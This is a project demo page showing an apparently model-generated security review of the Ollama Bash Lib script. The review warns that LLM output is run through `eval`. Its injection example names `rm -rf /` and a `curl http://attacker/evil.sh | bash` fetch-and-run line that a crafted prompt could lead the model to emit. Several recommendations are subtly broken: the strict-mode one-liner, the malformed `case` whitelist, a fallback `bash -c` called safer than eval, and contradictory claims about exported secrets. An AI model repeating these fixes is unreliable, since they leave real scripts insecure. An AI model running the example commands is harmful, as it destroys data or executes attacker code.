# Security Review of [ollama_bash_lib.sh](../ollama_bash_lib.sh)

A [demo](../README.md#demos) of [Ollama Bash Lib](https://github.com/attogram/ollama-bash-lib) v0.43.4


```bash
task="Act as an Expert Security Professional.
Do a Security Review of this bash script.
Require that script works in Bash v3.2 or higher.
Output your review in Markdown format."
file="../ollama_bash_lib.sh"
ollama_generate "gpt-oss:120b" "$task\n\n$(cat "$file")"
```
# Security Review – **Ollama Bash Library**  

**Target Bash version:** 3.2 or higher  

**Scope:** The entire script (functions, globals, and utility code).  

---  

## 1. Executive Summary  

The library is a fairly complete wrapper around the Ollama HTTP API.  From a functionality standpoint it works on Bash 3.2+, but several security‑relevant patterns deserve attention:

| Category | Severity | Issue |
|----------|----------|-------|
| **Command Injection** | **High** | `eval "$cmd"` in `ollama_eval` runs arbitrary code generated by the LLM without sandboxing. |
| **Input Validation / Sanitisation** | Medium | User‑controlled strings are passed directly to `curl` (`_call_curl` endpoint, JSON body) and to `jq` (`--argjson`) without any whitelisting. |
| **Secret Handling** | Medium | API key (`OLLAMA_LIB_TURBO_KEY`) is stored in a global variable and later exported implicitly via `export OLLAMA_LIB_API`; if the script is sourced by another process the key may be exposed via the environment of child processes. |
| **Information Disclosure** | Low | Debug output (`_debug`) prints the full command line and request payload, only partially redacted. |
| **Error‑handling / Exit‑states** | Low | No `set -e` / `set -u`; many functions rely on manual error returns, which can be missed by callers. |
| **Compatibility** | None | All used Bash features (arrays, `${var:offset:length}`, `$RANDOM`, `${#var}`) are present in Bash 3.2. |

The remainder of the script follows decent practices (quoted expansions, `command -v` checks, `pipefail`, etc.), but the points above constitute the primary attack surface.

---  

## 2. Detailed Findings  

### 2.1. Command‑Injection via `eval`  

```bash
# ollama_eval()
...
eval "$cmd"
```

* **Why it matters** – The LLM‑generated `$cmd` is executed verbatim after a single “y/N” prompt.  An attacker who can influence the *task* argument (or the model) could obtain arbitrary command execution, especially if the prompt is crafted to make the model output something like `rm -rf /` or `curl http://attacker/evil.sh | bash`.  

* **Mitigations**  
  * **Never use `eval`** on untrusted data. Prefer to run the command in a subshell with an explicit whitelist:  
    ```bash
    case "$first" in
      ls|cat|grep|awk|sed|...), exec "$cmd" ;;
      *) printf '⚠️  Refused: command not in whitelist\n' ;;
    esac
    ```  
  * Run the generated command inside a sandbox (e.g., `docker run --rm -i alpine sh -c "$cmd"` or `bwrap`).  
  * Require explicit user confirmation *and* a secondary review step (e.g., diff the command against a known‑good list).  

### 2.2. Unsanitised Endpoint / JSON Body  

```bash
_call_curl "GET" "$1"
```

* `$1` may be supplied by a caller of `ollama_api_get`.  If a malicious script passes something like `"/api/../etc/passwd"` the request could be redirected to unintended resources.  

* JSON bodies are built with `jq` (`--argjson messages "$messages_array_json"`).  If the array contains malicious content that is not valid JSON, `jq` will error, but the error is not always checked, potentially leaking the raw string via `_debug`.  

**Mitigations**  

* Validate the endpoint against a whitelist (e.g., `[[ $endpoint = /api/* ]]`).  
* Use `curl --data @-` only after confirming `$json_body` is *valid* JSON (`_is_valid_json`).  
* When constructing JSON, prefer `--argjson` only for already‑parsed JSON; otherwise use `--arg` (which safely escapes).  

### 2.3. Secret / API‑Key Exposure  

* The key is kept in `OLLAMA_LIB_TURBO_KEY` (not exported), which is good.  
* However `ollama_app_turbo` subsequently does:  

  ```bash
  export OLLAMA_HOST="$host_api"
  export OLLAMA_LIB_API="$host_api"
  ```  

  If a downstream script sources this library **after** turbo mode is enabled, the key remains only in the parent shell, but any child process that inherits the environment **will not** receive it (since it isn’t exported).  The risk is low, yet the line:

  ```bash
  _debug "OLLAMA_LIB_TURBO_KEY: (${#OLLAMA_LIB_TURBO_KEY} characters)"
  ```

  prints the *length* of the key, which can be leveraged for enumeration attacks.

**Mitigations**  

* Keep all secret handling internal: do not export any variables that could be used to infer the key.  
* Redact the key length in debug output, or disable debug in production (`OLLAMA_LIB_DEBUG=0`).  

### 2.4. Debug Information Leakage  

* `_debug` prints the full (potentially redacted) message to **stderr**.  
* The redaction only replaces occurrences of `${OLLAMA_LIB_TURBO_KEY}`.  If other secrets appear (e.g., a password supplied in a prompt), they are printed in clear text.  

**Mitigations**  

* Centralise redaction logic: pass any string through `_redact` before printing, not just the explicit debug argument.  
* Offer a `--safe` flag to strip all non‑ASCII characters that could hide secrets.  

### 2.5. Incomplete Error Propagation  

* Many functions capture the exit code of a helper (`error_curl=$?`) and then re‑return it, which is fine.  
* However the script **does not** enable `set -e` (exit on any error) or `set -u` (treat unset variables as errors).  Callers forgetting to test `$?` may continue with stale data.  

**Mitigations**  

* Add at the top of the library (after the shebang) a “safe mode” toggle:  

  ```bash
  ${OLLAMA_LIB_STRICT:-0} && set -euo pipefail
  ```  

  Users can enable strict mode by exporting `OLLAMA_LIB_STRICT=1`.  

### 2.6. Compatibility with Bash 3.2  

* The script uses only features available in Bash 3.2: ordinary indexed arrays, substring expansion, `$RANDOM`, `local`, `printf '%s'`.  
* No associative arrays, no `declare -A`, no advanced `${var//pattern/repl}` quirks that require Bash 4+.  
* `[[ ... =~ ... ]]` regex matching is present in Bash 3.2, but the `\b` word‑boundary escape works only with the `[[ ... =~ ... ]]` built‑in, which is fine.  

**Conclusion:** The script runs on Bash 3.2 without modification.

---  

## 3. Recommendations  

| # | Recommendation | Rationale |
|---|----------------|-----------|
| 1 | **Eliminate `eval`** – rewrite `ollama_eval` to execute commands via `exec` after whitelist validation, or run them inside a sandbox. | Prevent arbitrary code execution. |
| 2 | **Validate API endpoints** – enforce that `endpoint` starts with `/api/` and contains only allowed characters (`[A-Za-z0-9/_-]`). | Stops path‑traversal or malicious URLs. |
| 3 | **Strict JSON handling** – after building a payload, run `_is_valid_json` and abort if invalid. Use `--arg` for strings, `--argjson` only for pre‑validated JSON fragments. | Guarantees well‑formed request bodies. |
| 4 | **Secure secret handling** – never export variables containing secrets, and avoid printing the key length. Consider storing the key in a file with restrictive permissions (`chmod 600`). | Reduces chance of accidental leakage. |
| 5 | **Centralised redaction** – modify `_debug` to always invoke `_redact` on its argument, and expand redaction to cover any variable that may hold sensitive data (e.g., passwords). | Prevents accidental secret exposure via debug logs. |
| 6 | **Optional strict mode** – offer `OLLAMA_LIB_STRICT` to enable `set -euo pipefail` for callers that require stronger error handling. | Improves reliability and prevents misuse of stale variables. |
| 7 | **Whitelist dangerous commands** – in `ollama_eval` (or any wrapper that may run generated code) maintain a list of allowed utilities and refuse anything else. | Limits the impact of a malicious LLM output. |
| 8 | **Document the threat model** – clearly state that the library is intended for trusted environments and that user‑generated prompts may produce unsafe commands. | Sets correct expectations for downstream developers. |

---  

## 4. Sample Refactor of `ollama_eval` (illustrative)

```bash
# Safe version – no eval, explicit whitelist, sandbox via `bwrap`
ollama_eval() {
    local task=$1 model=$(_is_valid_model "$2") cmd
    # … same prompt generation and LLM call …
    cmd="$(ollama_generate "$model" "$prompt")"

    # -----------------------------------------------------------------
    # 1️⃣  Verify the command exists in the whitelist
    local first=${cmd%%[[:space:]]*}
    local -a whitelist=( ls cat grep awk sed head tail cut cut )
    local allowed=no
    for w in "${whitelist[@]}"; do
        [[ $first == "$w" ]] && { allowed=yes; break; }
    done
    [[ $allowed == yes ]] || {
        printf '❌  Command %s not allowed\n' "$first"
        return 1
    }

    # 2️⃣  Syntax check (kept from original)
    if ! errors=$(timeout 1 bash -n <<<"$cmd" 2>&1); then
        printf '❌ Invalid Bash syntax\n%s\n' "$errors"
        return 1
    fi

    # 3️⃣  Prompt the user
    printf '\nRun command (y/N)? '
    read -r permission
    [[ $permission =~ ^[Yy]$ ]] || { printf 'Aborted.\n'; return 0; }

    # 4️⃣  Execute inside a minimal sandbox (example: bwrap)
    if command -v bwrap >/dev/null; then
        bwrap --ro-bind /usr /usr \
              --tmpfs /tmp \
              --proc /proc \
              --dev /dev \
              --unshare-all \
              bash -c "$cmd"
    else
        # Fallback – still no eval, use exec
        bash -c "$cmd"
    fi
}
```

The above eliminates `eval`, validates the command against a whitelist, and optionally runs inside `bwrap` (or any sandbox the host provides).  Similar patterns can be applied to other “run generated code” functions.

---  

## 5. Conclusion  

The **Ollama Bash Lib** is functionally solid and compatible with Bash 3.2, but it contains **high‑risk command‑execution paths** and **moderate‑risk secret‑handling practices**.  By removing `eval`, tightening input validation, improving secret redaction, and offering a strict‑mode configuration, the library can be hardened against the most common attack vectors while preserving its usefulness.  

Implementing the recommendations will greatly reduce the likelihood of inadvertent code execution, data leakage, or misuse of the Ollama API in untrusted environments.  
